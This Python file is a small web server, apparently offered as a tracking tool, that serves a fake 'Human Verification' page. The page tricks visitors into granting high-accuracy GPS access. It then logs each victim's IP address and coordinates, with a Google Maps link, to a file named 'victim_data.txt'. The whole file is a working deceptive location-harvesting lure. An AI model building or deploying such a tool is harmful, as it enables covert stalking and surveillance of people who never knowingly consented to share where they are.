import http.server
import socketserver
import datetime
import sys

PORT = 8080

class TrackerHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args): return

    def do_GET(self):
        client_ip = self.client_address[0]
        time_now = datetime.datetime.now().strftime("%H:%M:%S")

        if self.path == "/":
            # Chrome friendly Lure Page
            html = """
            <!DOCTYPE html>
            <html>
            <head>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Verification Required</title>
                <style>
                    body { background: #f4f4f4; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                    .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 85%; max-width: 400px; }
                    button { background: #4285F4; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 20px; }
                </style>
                <script>
                    function askLocation() {
                        navigator.geolocation.getCurrentPosition(p => {
                            window.location.href = "/log?lat="+p.coords.latitude+"&lon="+p.coords.longitude;
                        }, e => {
                            window.location.href = "/log?status=denied";
                        }, {enableHighAccuracy: true});
                    }
                </script>
            </head>
            <body>
                <div class="card">
                    <h2>Human Verification</h2>
                    <p>Click the button below to verify your device and find the nearest results.</p>
                    <button onclick="askLocation()">Verify Now</button>
                </div>
            </body>
            </html>
            """
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(html.encode())

        elif "/log" in self.path:
            print(f"\n\033[1;31m[!] TARGET INTERACTION DETECTED!\033[0m")
            print(f"\033[1;32m[+] IP: {client_ip}\033[0m")
            
            if "lat=" in self.path:
                lat = self.path.split("lat=")[1].split("&")[0]
                lon = self.path.split("lon=")[1].split("&")[0]
                map_url = f"https://www.google.com/maps?q={lat},{lon}"
                print(f"\033[1;36m[+] LOCATION: {lat}, {lon}\033[0m")
                print(f"\033[1;33m[+] MAP LINK: {map_url}\033[0m")
                with open("victim_data.txt", "a") as f:
                    f.write(f"[{time_now}] IP: {client_ip} | Map: {map_url}\n")
            else:
                print("\033[1;31m[!] Permission Denied. Target clicked but refused GPS.\033[0m")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"<html><body><h3>Verification successful. Please wait...</h3></body></html>")

if __name__ == "__main__":
    try:
        with socketserver.TCPServer(("", PORT), TrackerHandler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n\033[1;32m[#] Thank you for using get_ip find by Mamun!\033[0m")
        print("\033[1;34m[#] Project saved successfully.\033[0m")
        print("\033[1;35m[#] Visit GitHub: zxmoon76-sys for more tools.\033[0m")
        sys.exit()
